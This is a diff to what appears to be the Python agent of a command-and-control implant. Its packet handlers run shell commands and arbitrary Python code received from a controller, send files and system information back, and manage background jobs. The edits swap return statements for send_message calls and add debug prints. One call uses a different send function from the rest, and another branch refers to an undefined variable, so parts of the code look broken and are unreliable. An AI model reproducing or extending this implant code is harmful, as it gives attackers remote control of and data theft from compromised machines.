@@ -146,7 +146,7 @@ def build_response_packet(taskingID, packetData, resultID=0):
     """
     print('response packet')
     print('taskingID: ' + str(type(taskingID)))
-    print('resultID: ' + str(type(resultID)))
+    print('packetData: ' + str(type(packetData)))
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
@@ -159,8 +159,12 @@ def build_response_packet(taskingID, packetData, resultID=0):
             packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
-        print('if packet data')
-        length = struct.pack('=L',len(packetData))
+        print('if packet data: agent.py')
+        try:
+            length = struct.pack('=L',len(packetData))
+            print('length not the issue')
+        except Exception as e:
+            print(e)
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
         print('else packet data')
@@ -280,7 +284,7 @@ def process_packet(packetType, data, resultID):
     if packetType == 1:
         # sysinfo request
         # get_sysinfo should be exposed from stager.py
-        return build_response_packet(1, get_sysinfo(), resultID)
+        send_message(build_response_packet(1, get_sysinfo(), resultID))
 
     elif packetType == 2:
         # agent exit
@@ -300,23 +304,24 @@ def process_packet(packetType, data, resultID):
                 print('type 40: 1')
                 data = parts[0]
                 resultData = str(run_command(data))
-                return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+                print('Type 40: 2')
+                send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
             except Exception as e:
                 print(e)
         else:
-            print('type 40: 2')
+            print('type 40: 3')
             print(str(type(parts)))
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
-            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
-
+            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
+        print('type 40 not the issue')
     elif packetType == 41:
         # file download
         objPath = os.path.abspath(data)
         fileList = []
         if not os.path.exists(objPath):
-            return build_response_packet(40, "file does not exist or cannot be accessed", resultID)
+            send_message(build_response_packet(40, "file does not exist or cannot be accessed", resultID))
 
         if not os.path.isdir(objPath):
             fileList.append(objPath)
@@ -390,7 +395,7 @@ def process_packet(packetType, data, resultID):
             msg = "Active jobs:\n"
             for x in range(len(jobs)):
                 msg += "\t%s" %(x)
-        return build_response_packet(50, msg, resultID)
+        send_message(build_response_packet(50, msg, resultID))
 
     elif packetType == 51:
         # stop and remove a specified job if it's running
@@ -423,7 +428,7 @@ def process_packet(packetType, data, resultID):
         print(code_obj)
         print('type 100: 403')
         results = buffer.getvalue()
-        return build_response_packet(100, str(results), resultID)
+        send_message(build_response_packet(100, str(results), resultID))
         #except Exception as e:
          #   errorData = str(buffer.getvalue())
           #  return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
@@ -444,11 +449,11 @@ def process_packet(packetType, data, resultID):
             comp_data = c.comp_data(buffer.getvalue())
             encodedPart = c.build_header(comp_data, start_crc32)
             encodedPart = base64.b64encode(encodedPart)
-            return build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID)
+            send_message(build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID))
         except Exception as e:
             # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
@@ -472,16 +477,16 @@ def process_packet(packetType, data, resultID):
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
                 result += "\n\nError removing module file, please verify path: " + str(implantPath)
-            return build_response_packet(100, str(result), resultID)
+            send_message(build_response_packet(100, str(result), resultID))
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
-                return build_response_packet(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath), resultID)
-            return build_response_packet(0, "error executing specified Python data: %s" %(e), resultID)
+                send_message(build_response_packet(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data: %s" %(e), resultID))
 
     elif packetType == 110:
         start_job(data)
-        return build_response_packet(110, "job %s started" %(len(jobs)-1), resultID)
+        send(build_response_packet(110, "job %s started" %(len(jobs)-1), resultID))
 
     elif packetType == 111:
         # TASK_CMD_JOB_SAVE
@@ -498,10 +503,10 @@ def process_packet(packetType, data, resultID):
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
-            return build_response_packet(121, result, resultID)
+            send_message(build_response_packet(121, result, resultID))
         except Exception as e:
             errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 122:
         #base64 decode and decompress the data
@@ -556,7 +561,7 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
 
     else:
-        return build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID)
+        send_message(build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID))
 
 
 ################################################
